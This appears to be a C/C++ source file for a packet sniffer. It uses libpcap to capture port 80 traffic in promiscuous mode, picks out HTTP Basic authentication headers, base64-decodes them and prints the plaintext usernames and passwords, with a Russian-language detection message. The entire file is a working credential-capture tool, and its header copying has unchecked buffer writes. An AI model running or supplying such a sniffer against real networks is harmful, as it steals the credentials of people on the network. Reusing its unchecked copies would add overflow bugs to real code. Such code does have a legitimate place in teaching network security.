#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <ctype.h>
#include <cstring>
#include <openssl/bio.h>
#include <openssl/evp.h>

size_t calcDecodeLength(const char* b64input) { //Calculates the length of a decoded string
    size_t len = strlen(b64input),
    padding = 0;
    if (b64input[len-1] == '=' && b64input[len-2] == '=') //last two chars are =
        padding = 2;
    else if (b64input[len-1] == '=') //last char is =
        padding = 1;
    return (len*3)/4 - padding;
}

int Base64Decode(char* b64message, char* buffer) { //Decodes a base64 encoded string
    BIO *bio, *b64;
    int decodeLen = calcDecodeLength(b64message);
    buffer[decodeLen] = '\0';
    bio = BIO_new_mem_buf(b64message, -1);
    b64 = BIO_new(BIO_f_base64());
    bio = BIO_push(b64, bio);
    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL); //Do not use newlines to flush buffer
    BIO_read(bio, buffer, strlen(b64message));
    BIO_free_all(bio);
    return (0); //success
}

void another_callback(u_char *arg, const struct pcap_pkthdr* pkthdr,
                      const u_char* packet)
{
    int pos, j, i;
    const char str[] = "Authorization: Basic ";
    char base64DecodeOutput[256], out[128];
    i = 0;
    while(i < pkthdr->len) {
        while((i < pkthdr->len) && (packet[i] != '\n')) {
            i ++;
        }
        i++;
        pos = 0;
        while (str[pos] == packet[i] && pos < strlen(str)) {
            pos++; i++;
        }
        if (pos == strlen(str)) {
            j = 0;
            while((i < pkthdr->len) && (packet[i] != '\n')) {
                out[j++] = packet[i++];
            }
            out[j-1] = 0;
            Base64Decode(out, base64DecodeOutput);
            printf("Обнаружен HTTP c Basic access authentication\n");
            printf("Hash: '%s' - '%s'\n", out, base64DecodeOutput);
        }
    }
}

int main(int argc, char *argv[])
{
    pcap_t *handle;
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char filter_exp[] = "port 80";
    bpf_u_int32 mask;
    bpf_u_int32 net;		/* Our IP */
    struct pcap_pkthdr header;	/* The header that pcap gives us */
    const u_char *packet;		/* The actual packet */
    
    if ((dev = pcap_lookupdev(errbuf)) == NULL) {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return(2);
    }
    if ((handle = pcap_open_live(dev, BUFSIZ, 1, 0, errbuf)) == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return(2);
    }
    if (pcap_compile(handle, &fp, filter_exp, 0, 0) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return(2);
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return(2);
    }
    pcap_loop(handle, -1, another_callback, NULL);
    pcap_close(handle);
    return(0);
}